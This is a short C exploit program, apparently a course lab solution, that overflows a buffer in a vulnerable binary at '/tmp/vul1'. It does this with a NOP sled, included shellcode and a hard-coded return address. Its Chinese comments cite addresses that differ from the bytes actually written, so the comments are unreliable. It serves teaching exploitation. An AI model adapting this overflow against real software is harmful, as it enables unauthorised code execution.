#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul1"

int main(void)
{
	char payload[264];
	//初始化，全部置为nop
	memset(payload, '\x90', 264);
	//将shellcode复制到payload中
	memcpy(payload+32, shellcode, 25);
	//最后8个字节改为ebp ffff cf08和shellcode(buff)地址ffffceo8
	memcpy(payload+256, "\x90\x90\x90\x90", 4);
	memcpy(payload+260, "\x4c\xdc\xff\xff", 4);
  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

